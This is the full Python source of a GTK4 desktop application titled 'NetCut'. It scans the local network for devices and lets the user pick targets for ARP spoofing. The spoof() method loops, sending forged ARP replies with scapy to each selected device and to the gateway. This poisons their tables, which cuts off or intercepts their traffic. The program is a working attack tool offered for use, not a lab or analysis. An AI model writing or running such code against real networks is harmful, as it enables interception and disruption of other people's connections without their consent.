import gi
gi.require_version('Gtk', '4.0')
gi.require_version('Adw', '1')
from gi.repository import Gtk, GLib, Gio, Adw

import scapy.all as scapy
import time
import threading
import ipaddress
import netifaces
import subprocess
import re
import logging
from datetime import datetime
import concurrent.futures
import socket

class NetworkTool(Adw.Application):
    def __init__(self):
        super().__init__(application_id="com.example.NetworkTool", flags=Gio.ApplicationFlags.FLAGS_NONE)
        self.connect('activate', self.on_activate)
        self.is_scanning = False
        self.is_spoofing = False
        self.devices = []
        self.setup_logging()
        self.network = self.get_local_network()
        self.gateway_ip = self.get_default_gateway()
        self.log_message(f"Network set to: {self.network}", logging.DEBUG)
        self.log_message(f"Gateway IP set to: {self.gateway_ip}", logging.DEBUG)
        self.thread_count = 30
        self.original_thread_count = self.thread_count

    def setup_logging(self):
        self.logger = logging.getLogger('NetworkTool')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

    def log_message(self, message, level=logging.INFO):
        self.logger.log(level, message)
        if hasattr(self, 'status_label'):
            GLib.idle_add(self.update_status_label, message)

    def update_status_label(self, message):
        if hasattr(self, 'status_label'):
            self.status_label.set_text(f"{message}")

    def get_local_network(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip_address = addr['addr']
                        netmask = addr['netmask']
                        if ipaddress.ip_address(default_gateway) in ipaddress.ip_network(f"{ip_address}/{netmask}", strict=False):
                            self.log_message(f"Detected local network: {ip_address}/{netmask}")
                            return f"{ip_address}/{netmask}"
        except Exception as e:
            self.log_message(f"Error detecting network: {e}", logging.ERROR)
        return None

    def get_default_gateway(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            self.log_message(f"Detected default gateway: {default_gateway}")
            return default_gateway
        except Exception as e:
            self.log_message(f"Error detecting default gateway: {e}", logging.ERROR)
            return None

    def on_activate(self, app):
        # Create the main window
        self.window = Adw.ApplicationWindow(application=app, title="NetCut")
        self.window.set_default_size(600, 400)

        # Create the main box
        main_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=0)
        self.window.set_content(main_box)

        # Create a header bar
        header = Adw.HeaderBar()
        main_box.append(header)

        # Add refresh button to the header
        self.refresh_button = Gtk.Button.new_from_icon_name("view-refresh-symbolic")
        self.refresh_button.add_css_class("flat")
        self.refresh_button.connect("clicked", self.on_refresh_clicked)
        header.pack_start(self.refresh_button)

        # Add hamburger menu
        menu_button = Gtk.MenuButton()
        menu_button.set_icon_name("open-menu-symbolic")
        menu_button.add_css_class("flat")
        header.pack_end(menu_button)

        # Create a popover for the menu
        self.popover = Gtk.Popover()
        menu_button.set_popover(self.popover)

        # Create a box for the popover content
        popover_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)
        popover_box.set_margin_top(6)
        popover_box.set_margin_bottom(6)
        popover_box.set_margin_start(6)
        popover_box.set_margin_end(6)
        self.popover.set_child(popover_box)

        # Add thread count spin button to the popover
        thread_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        thread_label = Gtk.Label(label="Thread Count")
        thread_box.append(thread_label)

        adjustment = Gtk.Adjustment(value=self.thread_count, lower=1, upper=100, step_increment=1, page_increment=10)
        self.thread_entry = Gtk.SpinButton()
        self.thread_entry.set_adjustment(adjustment)
        self.thread_entry.connect("value-changed", self.on_thread_count_changed)
        thread_box.append(self.thread_entry)

        popover_box.append(thread_box)

        # Add a separator
        popover_box.append(Gtk.Separator(orientation=Gtk.Orientation.HORIZONTAL))

        # Add About button
        about_button = Gtk.Button(label="About")
        about_button.connect("clicked", self.on_about_clicked)
        popover_box.append(about_button)

        # Create a content area with Clamp
        content_clamp = Adw.Clamp()
        content_clamp.set_maximum_size(800)
        content_clamp.set_tightening_threshold(600)
        main_box.append(content_clamp)

        self.content_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=24, margin_top=24, margin_bottom=24, margin_start=12, margin_end=12)
        content_clamp.set_child(self.content_box)

        # Network info
        network_box = Adw.PreferencesGroup()
        self.content_box.append(network_box)

        self.network_row = Adw.ActionRow(title="Network", icon_name="network-wired-symbolic")
        network_box.add(self.network_row)

        self.gateway_row = Adw.ActionRow(title="Gateway", icon_name="network-server-symbolic")
        network_box.add(self.gateway_row)

        # Update network labels
        self.update_network_label()

        # Device list
        self.device_group = Adw.PreferencesGroup()
        self.content_box.append(self.device_group)

        # Add header buttons
        self.header_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        
        self.select_all_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        self.select_all_switch = Gtk.Switch()
        self.select_all_switch.set_valign(Gtk.Align.CENTER)
        self.select_all_switch.connect("notify::active", self.on_select_all_toggled)
        self.select_all_box.append(Gtk.Label(label="Select All"))
        self.select_all_box.append(self.select_all_switch)
        self.header_box.append(self.select_all_box)

        self.device_group.set_header_suffix(self.header_box)

        # Loading spinner
        self.spinner = Gtk.Spinner()
        self.spinner.set_size_request(32, 32)
        self.content_box.append(self.spinner)

        # Status label
        self.status_label = Gtk.Label(label="Status: Idle")
        self.status_label.add_css_class('caption')
        self.status_label.set_halign(Gtk.Align.CENTER)
        self.content_box.append(self.status_label)

        # Add Pill button for spoofing
        spoof_button_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, halign=Gtk.Align.CENTER, margin_top=24, margin_bottom=12)
        self.spoof_button = Gtk.Button(label="Start Spoofing")
        self.spoof_button.add_css_class('pill')
        self.spoof_button.add_css_class('suggested-action')
        self.spoof_button.connect("clicked", self.on_spoof_clicked)
        spoof_button_box.append(self.spoof_button)
        self.content_box.append(spoof_button_box)

        self.window.present()

        # Start initial scan
        self.start_scan()

    def update_network_label(self):
        self.network_row.set_subtitle(self.network)
        self.gateway_row.set_subtitle(self.gateway_ip)

    def update_status_label(self, message):
        if hasattr(self, 'status_label'):
            self.status_label.set_text(f"{message}")

    def on_thread_count_changed(self, spin_button):
        self.thread_count = spin_button.get_value_as_int()
        self.log_message(f"Thread count set to {self.thread_count}")
        self.popover.popdown()  # Close the popover after changing the thread count

    def on_about_clicked(self, button):
        self.popover.popdown()  # Close the popover before opening the About dialog
        about_dialog = Gtk.AboutDialog()
        about_dialog.set_transient_for(self.window)
        about_dialog.set_modal(True)

        about_dialog.set_program_name("Network Tool")
        about_dialog.set_version("1.0")
        about_dialog.set_copyright("© 2023 Your Name")
        about_dialog.set_comments("A network scanning and ARP spoofing tool.")
        about_dialog.set_website("https://example.com")
        about_dialog.set_website_label("Website")
        about_dialog.set_authors(["Your Name"])
        about_dialog.set_documenters(["Your Name"])
        about_dialog.set_artists(["Your Name"])
        about_dialog.set_license_type(Gtk.License.GPL_3_0)

        about_dialog.connect("close-request", self.on_about_dialog_close)
        about_dialog.present()

    def on_about_dialog_close(self, dialog):
        dialog.destroy()

    def on_refresh_clicked(self, button):
        # Update network and gateway information
        self.network = self.get_local_network()
        self.gateway_ip = self.get_default_gateway()
        
        # Update the network label
        GLib.idle_add(self.update_network_label)
        
        # Start the scan
        self.start_scan()

    def start_scan(self):
        if not self.is_scanning and self.network:
            self.is_scanning = True
            self.spinner.start()
            self.log_message("Scanning network...")
            self.select_all_box.set_visible(False)  # Hide select all button during scanning
            threading.Thread(target=self.scan_network, daemon=True).start()
        elif not self.network:
            self.log_message("No network detected. Unable to scan.", logging.ERROR)

    def scan_network(self):
        try:
            new_devices = []
            # First, try ARP scan
            self.arp_scan(new_devices)
            
            # If ARP scan didn't find any devices, try ping scan
            if not new_devices:
                self.log_message("ARP scan found no devices. Trying ping scan...", logging.DEBUG)
                self.ping_scan(new_devices)

            # Update self.devices with only the new devices found
            self.devices = new_devices

            # Update UI on the main thread
            GLib.idle_add(self.update_device_list)
        except Exception as e:
            self.log_message(f"Error during network scan: {str(e)}", logging.ERROR)
        finally:
            self.log_message(f"Scan completed. Found {len(self.devices)} devices.")
            self.is_scanning = False
            GLib.idle_add(self.spinner.stop)
            GLib.idle_add(self.select_all_box.set_visible, True)  # Show select all button after scanning

    
    def arp_scan(self, devices):
        try:
            self.log_message(f"Starting ARP scan on network: {self.network}", logging.DEBUG)
            arp_request = scapy.ARP(pdst=self.network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            for element in answered_list:
                devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
            self.log_message(f"ARP scan completed. Found {len(devices)} devices.")
        except Exception as e:
            self.log_message(f"ARP scan error: {e}", logging.ERROR)

    def ping_scan(self, devices):
        try:
            self.log_message(f"Starting ping scan on network: {self.network}", logging.DEBUG)
            network = ipaddress.ip_network(self.network, strict=False)
            ip_list = list(network.hosts())
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                futures = [executor.submit(self.ping_and_get_mac, str(ip)) for ip in ip_list]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        devices.append(result)
            
            self.log_message(f"Ping scan completed. Found {len(devices)} devices.")
        except Exception as e:
            self.log_message(f"Ping scan error: {e}", logging.ERROR)

    def ping_and_get_mac(self, ip):
        try:
            self.log_message(f"Pinging {ip}", logging.DEBUG)
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                mac = self.get_mac_address(ip)
                device_info = self.get_hostname(ip)
                if mac:
                    return {'ip': ip, 'mac': mac, 'hostname': device_info}
        except Exception as e:
            self.log_message(f"Error pinging {ip}: {e}", logging.ERROR)
        return None

    def get_mac_address(self, ip):
        try:
            self.log_message(f"Getting MAC address for {ip}", logging.DEBUG)
            result = subprocess.run(['arp', '-n', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result.stdout)
            return mac.group(0) if mac else "Unknown"
        except Exception as e:
            self.log_message(f"Error getting MAC address for {ip}: {e}", logging.ERROR)
            return "Unknown"

    def get_hostname(self, ip):
        try:
            # Try reverse DNS lookup first
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except socket.herror:
            try:
                # If reverse DNS fails, try using the 'nmblookup' command (for Windows devices)
                result = subprocess.run(['nmblookup', '-A', ip], capture_output=True, text=True, timeout=1)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '<00>' in line and 'ACTIVE' in line:
                        return line.split()[0].strip()
            except (subprocess.SubprocessError, IndexError, FileNotFoundError):
                pass
            
            try:
                # If nmblookup fails or isn't available, try using 'avahi-resolve' for mDNS resolution
                result = subprocess.run(['avahi-resolve', '-a', ip], capture_output=True, text=True, timeout=1)
                if result.returncode == 0:
                    hostname = result.stdout.strip().split('\t')[1]
                    return hostname
            except (subprocess.SubprocessError, IndexError, FileNotFoundError):
                pass
            
            try:
                # If all else fails, try to get the hostname from ARP cache
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=1)
                arp_output = result.stdout.strip()
                if arp_output:
                    return "Unknown Device"
            except subprocess.SubprocessError:
                pass
            
            # If all methods fail, return a generic name with the IP
            return "Unknown Device"

    def update_device_list(self):
        existing_devices = {}
        
        # First, gather all existing devices
        for row in self.device_group:
            if isinstance(row, Adw.ExpanderRow):
                ip = row.get_title()
                existing_devices[ip] = row

        # Update existing devices and add new ones
        for device in self.devices:
            icon_name = self.get_device_icon(device)
            
            if device['ip'] in existing_devices:
                # Update existing device
                expander_row = existing_devices[device['ip']]
                expander_row.set_subtitle(device.get('hostname', 'Unknown'))
                
                # Update icon
                icon = expander_row.get_prefix()
                if isinstance(icon, Gtk.Image):
                    icon.set_from_icon_name(icon_name)
                
                # Update MAC address
                mac_row = expander_row.get_row_at_index(0)
                mac_row.set_subtitle(device['mac'])
                
                # Update hostname
                hostname_row = expander_row.get_row_at_index(1)
                hostname_row.set_subtitle(device.get('hostname', 'Unknown'))
                
                # Update switch state
                switch = expander_row.get_action_widgets()[0]
                if isinstance(switch, Gtk.Switch):
                    switch.set_active(device.get('spoof', False))
            else:
                # Add new device
                expander_row = Adw.ExpanderRow(title=device['ip'], subtitle=device.get('hostname', 'Unknown'))
                expander_row.add_prefix(Gtk.Image.new_from_icon_name(icon_name))
                
                switch = Gtk.Switch()
                switch.set_active(device.get('spoof', False))
                switch.connect("notify::active", self.on_device_switch_toggled, device)
                switch.set_valign(Gtk.Align.CENTER)
                expander_row.add_action(switch)

                mac_row = Adw.ActionRow(title="MAC Address", subtitle=device['mac'])
                expander_row.add_row(mac_row)

                hostname_row = Adw.ActionRow(title="Hostname", subtitle=device.get('hostname', 'Unknown'))
                expander_row.add_row(hostname_row)

                self.device_group.add(expander_row)
            
            # Mark this device as processed
            existing_devices[device['ip']] = None

        # Remove devices that no longer exist
        for ip, row in existing_devices.items():
            if row is not None:
                self.device_group.remove(row)

        self.update_select_all_switch()

    def get_device_icon(self, device):
        hostname = device.get('hostname', '').lower()
        ip = device['ip']
        
        if ip == self.gateway_ip:
            return "network-server-symbolic"
        elif 'phone' in hostname or 'android' in hostname or 'iphone' in hostname:
            return "phone-symbolic"
        elif 'laptop' in hostname or 'notebook' in hostname:
            return "computer-laptop-symbolic"
        elif 'desktop' in hostname or 'pc' in hostname:
            return "computer-symbolic"
        elif 'tablet' in hostname or 'ipad' in hostname:
            return "tablet-symbolic"
        elif 'tv' in hostname or 'television' in hostname:
            return "tv-symbolic"
        elif 'printer' in hostname:
            return "printer-symbolic"
        elif 'camera' in hostname:
            return "camera-symbolic"
        elif 'nas' in hostname or 'storage' in hostname:
            return "drive-harddisk-symbolic"
        else:
            return "network-wired-symbolic"  # Default icon for unknown devices

    def update_select_all_switch(self):
        all_active = all(device.get('spoof', False) for device in self.devices)
        any_active = any(device.get('spoof', False) for device in self.devices)
        
        self.select_all_switch.handler_block_by_func(self.on_select_all_toggled)
        if all_active:
            self.select_all_switch.set_active(True)
        elif not any_active:
            self.select_all_switch.set_active(False)
        else:
            # If some but not all devices are active, set the switch to an intermediate state
            # We can't use the inconsistent state, so we'll just set it to active
            self.select_all_switch.set_active(True)
        self.select_all_switch.handler_unblock_by_func(self.on_select_all_toggled)

    def on_select_all_toggled(self, switch, _pspec):
        active = switch.get_active()
        for row in self.device_group:
            if isinstance(row, Adw.ExpanderRow):
                device_switch = row.get_action_widgets()[0]
                if isinstance(device_switch, Gtk.Switch):
                    device_switch.set_active(active)
        
        for device in self.devices:
            device['spoof'] = active
        
        self.log_message(f"All devices set to {'spoof' if active else 'not spoof'}")

    def on_device_switch_toggled(self, switch, _pspec, device):
        device['spoof'] = switch.get_active()
        self.log_message(f"Device {device['ip']} spoofing set to {device['spoof']}")
        self.update_select_all_switch()

    def on_spoof_clicked(self, button):
        if not self.is_spoofing:
            if self.gateway_ip:
                self.is_spoofing = True
                self.spoof_button.set_label("Stop Spoofing")
                self.spoof_button.remove_css_class("suggested-action")
                self.spoof_button.add_css_class("destructive-action")
                self.log_message("Starting ARP spoofing...")
                threading.Thread(target=self.spoof, daemon=True).start()
            else:
                self.log_message("Cannot start spoofing: No gateway detected", logging.ERROR)
        else:
            self.is_spoofing = False
            self.spoof_button.set_label("Start Spoofing")
            self.spoof_button.remove_css_class("destructive-action")
            self.spoof_button.add_css_class("suggested-action")
            self.log_message("Stopping ARP spoofing...")

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            self.log_message(f"Gateway MAC: {gateway_mac}")
            
            while self.is_spoofing:
                for device in self.devices:
                    if device.get('spoof', False):
                        target_ip = device['ip']
                        target_mac = device['mac']
                        # Spoof target
                        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                        # Spoof gateway
                        scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                self.log_message("ARP spoofing in progress...", logging.DEBUG)
                time.sleep(2)

            self.restore_network()
        except Exception as e:
            self.log_message(f"Error during ARP spoofing: {str(e)}", logging.ERROR)

    def restore_network(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            for device in self.devices:
                if device.get('spoof', False):
                    target_ip = device['ip']
                    target_mac = device['mac']
                    # Restore target
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
                    # Restore gateway
                    scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
            self.log_message("Network restored to normal state.")
        except Exception as e:
            self.log_message(f"Error restoring network: {str(e)}", logging.ERROR)

if __name__ == "__main__":
    app = NetworkTool()
    app.run(None)